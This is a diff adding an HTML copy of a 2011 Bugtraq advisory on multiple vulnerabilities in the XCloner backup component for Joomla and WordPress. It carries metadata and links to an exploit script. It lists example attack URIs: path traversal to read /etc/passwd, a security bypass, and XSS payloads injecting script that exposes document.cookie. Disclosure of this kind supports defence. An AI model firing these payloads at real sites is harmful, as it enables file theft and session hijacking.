@@ -1,0 +1,96 @@
+#SpeeDr00t@Black Falcon<br>#bid46582<p><b><span style="font-size: 18pt;">Joomla XCloner Component 'com_xcloner-backupandrestore' Multiple Security Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/46582/info">info</a><br><a href="http://www.securityfocus.com/bid/46582/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/46582/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/46582/solution">solution</a><br><a href="http://www.securityfocus.com/bid/46582/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				46582
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Feb 25 2011 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Feb 25 2011 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				mr_me
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					XCloner XCloner  0<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x47000/46582/46582.py">#exploit_46582.py</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can exploit these issues through a browser. To exploit the cross-site scripting issue, the attacker must entice an unsuspecting user to follow a malicious URI.<br/><br/>The following example URIs are available:<br/><br/>Local File Inclusion:<br/>http://www.example.com/path/wp-content/plugins/xcloner-backup-and-restore/cloner.cron.php?config=../../../../../../../../etc/passwd<br/>http://www.example.com/path/administrator/components/com_xcloner-backupandrestore/cloner.cron.php?config=../../../../../../../../etc/passwd<br/><br/>Security Bypass:<br/>http://www.example.com/wp path/wp-content/plugins/xcloner-backup-and-restore/restore/XCloner.php?task=step2&amp;amp;output_path=path/file<br/>http://www.example.com/path/administrator/components/com_xcloner-backupandrestore/restore/XCloner.php?task=step2&amp;amp;output_path=path/file<br/><br/>XSS:<br/>http://www.example.com/path/wp-content/plugins/xcloner-backup-and-restore/index2.php?option=com_cloner&amp;amp;mosmsg=&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;<br/>http://www.example.com/path/wp-content/plugins/xcloner-backup-and-restore/index2.php?username=adsc&amp;amp;password=dac&amp;amp;option=com_cloner<br/>";alert(document.cookie)//&amp;amp;task=dologin&amp;amp;boxchecked=0&amp;amp;hidemainmenu=0<br/>http://www.example.com/path/administrator/components/com_xcloner-backupandrestore/index2.php?option=com_cloner&amp;amp;mosmsg=<br/>&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/46582.py">/data/vulnerabilities/exploits/46582.py</a></li>
+</ul>
+</div>
